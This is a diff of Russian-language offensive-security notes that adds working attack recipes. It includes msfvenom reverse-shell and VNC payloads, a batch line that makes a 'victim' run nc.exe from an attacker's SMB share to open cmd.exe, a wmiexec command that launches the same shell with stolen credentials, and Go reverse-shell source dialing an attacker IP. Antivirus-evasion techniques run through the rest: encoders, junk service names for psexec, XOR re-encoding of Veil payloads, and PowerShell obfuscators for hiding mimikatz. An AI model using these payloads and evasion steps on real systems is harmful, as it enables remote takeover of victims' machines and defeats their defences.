@@ -1268,6 +1268,19 @@ post/widows/gather/credetials/gpp
 
 Antivirus Bypass
 
+Bind - пробили и открыл порты
+Reverse - жертва коннектится к нам 
+
+
+
+Reverse shell (Standard)
+$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<ip> lport=<11337> -f exe -o reverse_tcp.exe
+msf6> use exploit/multi/handler
+
+Reverse shell (Stageless более скрытный от антивирусов)
+$ msfvenom -p windows/x64/shell_reverse_tcp lhost=<ip> lport=<11337> -f exe -o ncshell.exe
+$ nc -nvlp 11337
+
 
 
 Payload через макросы
@@ -1275,17 +1288,34 @@ $ msfvenom -p windows/meterpreter/reverse_tcp lhost=<ip> lport=<port> -f vba
 Документ -> Macro -> create
 msf6> use exploit/multi/handler
 
+Если все еще палится, ищем vba обфускаторы и используем их
+
+
 
 Просмотр рабочего стола по vnc
-msfvenom> -p windows/vncinject/reverse_tcp lhost=<ip> lport=<port> -f exe -o malware.exe
+$ msfvenom -p windows/vncinject/reverse_tcp lhost=<ip> lport=<port> -f exe -o vnc.exe
 
 
 
-Список енкодеров для нагрузки
-$ msfvenom --list encoders		Список енкодеров
-$ msfvenom -i				Кол-во иттераций енкодера
+Генерируем сервисный exe (предположим, он не детектится антивирусом)
+$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="ip" LPORT="port" -f exe-service -o meter_service.exe
+Выполняем psexec с кастомным exe файлом
+msf6> use windows/sbm/psexec
+msg6> set exe::custom meter_service.exe
+Ставим в названия и в описание сервиса мусор, что бы не было детекта по этим полям
+msf6> set SERVICE_<NAME, DESCRIPTION, DISPLAY_NAME> blablabla
 
--e x86/alpha
+
+
+Энкодеры для нагрузки
+$ msfvenom --list encoders			Список енкодеров
+$ msfvenom -i <55>				Кол-во иттераций енкодера
+-e <x86/x64>/shikata_ga_nai			Один из популярных энкодеров для обхода антивирусников 
+-e x86/alpha_upper
+-e x86/jmp_call_additive
+
+Энкодеры нужны не только для маскировки, но и для более стабльного запуска бинарных файлов (обход "плохих" символов)
+
 
 
 Закодированный vnc шелл (не сильно помогает)
@@ -1295,45 +1325,81 @@ msfvenom> -p windows/vncinject/reverse_tcp lhost=<ip> lport=<port> -f exe -e x86
 
 ##### НЕ БЫТЬ ВИРУСОМ #####
 В Kali есть легитимные виндовые бинарники
-/usr/share/windows-resources/binaries
+/usr/share/windows-resources/binaries/
+nc.exe		
+plink.exe		аналог ssh
+wget.exe
 
 
-Беспалевный reverse shell
 
-Поднимаем шару
-$ sudo impacket/examples/smbserver.py <smbname> . -smbsupport
+"скрытый" Reverse Shell
 
-Ловим подключение
-$ nc -nvlp <port>
+1. Копируем бинарник
+$ cp /usr/share/windows-resources/binaries/nc.exe .
+2. Поднимаем шару (если Errno 98 $sudo lsof -i :445; $ sudo kill <PID>)
+$ sudo impacket/examples/smbserver.py kek . -smb2support
+3. Поднимаем лисенер
+$ nc -nvlp <lport>
+4. Записываем в .bat и отдаем жертве на запуск
+%COMSPEC% /b /c start /b /min \\<share ip>\kek\nc.exe <lhost> <lport> -e cmd.exe
 
-Записываем в батник и отдаем жертве на запуск
-%COMSPEC% /b /c start /b /min \\<share ip>\<smbname>\nc.exe <nc ip> <nc port> -e cmd.exe
+Побочные эффекты:
+*Запуск затрудняет Windows Defender (запустить в любом случае)
+*При запуске открывается консоль на весь экран (сделать ее скрытой) 
+*Предупреждение от Kaspersky об обнаружени программы для удаленного адмиинистррования
+Тем не менее, после прохожденя первого шага шелл не упадет автоматически
 
 
-$ impacket/examples/wmiexec.py -h .Admin:Pa$$w0rd@<target ip> 
+Если есть учетная запись, можем сами выполнить команду за жертву
+$ impacket/examples/wmiexec.py -h ./Admin:Pa$$w0rd@<RHOST> '\\<LHOST>\kek\nc.exe <LHOST> <LPORT> -e cmd.exe'
 
 
-Утилита для скрытного подключения
+Утилита для подключения (PowerShell реализаця nc) Bind Shell
 https://github.com/besimorhino/powercat
+На жертве
+PS C:\> Invoke-PowerShellTcp -Bind -Port 4444
+На своей винде
+PS C:\> powercat -с <RHOST> -v -p <RPORT>
 
-
-PS c:\> powercat -с <ip>
+*Касперский спалил powercat
 
 
 Powershell обфускация (новые появляются постоянно, проще загуглить)
+"powershell obfuscator site:github.com" + фильтр 'За месяц'
 Если использовать несколько разных обфускаторов, то надежность больше
+Так же можно заворачвать mimikatz
 https://github.com/danielbohannon/Invoke-Obfuscation
 https://github.com/CBHue/PyFuscation
-https://github.com/
-https://github.com/
+https://github.com/cwolff411/powerob
+https://github.com/TheEyeOfCyber/FernHunt_WindowsPowershell-Obfuscator
+https://github.com/the-xentropy/xencrypt
 
 
 
 ##### БЫТЬ НЕОЖИДАННЫМ #####
-
 Используем редкие языки
 
 <скрипт из презентации на GO>
+package main
+import ("bufio"
+	"fmt"
+	"net"
+	"os/exec"
+	"strings")
+func main() {
+	conn, _ := net.Dial("tcp", "<10.1.75.200>:<8081>")
+	for { message, _ := bufio.NewReader(conn).ReadString('\n')
+		out, err := exec.Command(strings.TrimSuffix(message, "\n")).Output()
+		if err != nil { fmt.Fprintf(conn, "%s\n",err) }
+		fmt.Fprintf(conn, "%s\n",out)}}
+	
+Компиляция
+$ env GOOS=windows GOARCH=386 go build rev.go
+
+Действительно работает!
+* Не все команды получается выполнить
+* Вероятно, шелл не интерактивный
+* Это просто Proof Of Concept
 
 
 
@@ -1345,6 +1411,26 @@ setup.sh -c
 
 OR 
 docker run -it -v /tmp/veil-output:/var/lib/veil/output:Z mattiasohlsson/veil
+
+Получаем перекодированную нагрузку, которая не будет палиться
+1. Сгенерировав нагрузку (см 2:40:00), нас интересует исходник 
+[*] Source code written to: <file>
+2. Берем 3-ю строку 	
+UIMaArEiYYfHs = base64.b64decode("/OiGAAAAYInlMdJki1Iwi1IM.../9UBwynGhfZ17MM=")
+3. Через питон прогоняем ее через XOR 123
+$ python2
+>>> ''.join([chr(ord(e)^123) for e in "/OiGAAA...17MM".decode("base64")]).encode("base64").replace('\n','')
+'/Lb5hdReyLNB0o5...6uFK9='
+4. Вставляем новую строку вместо старой в исходник с обратным алгоритмом
+UIMaArEiYYfHs = ''.join([char(ord(e)^123) for e in "/Lb5hdReyLNB0o5...6uFK9=".decode("base64")])
+5. Собираем из исходника питона .exe
+$ docker run -v /home/<kali>:/src/ cdrx/pyinstaller-windows:python2 pyinstaller --onefile <meter_veil.py>
+
+*По хорошему, надо бы написать автоматизацию =)
+
+
+
+Можно купить лицензию VMProtect (защищает продукт от антивирусов), но блэчить не получится. Стоит около 1000$ в год
 
 
 find . -name *.bat
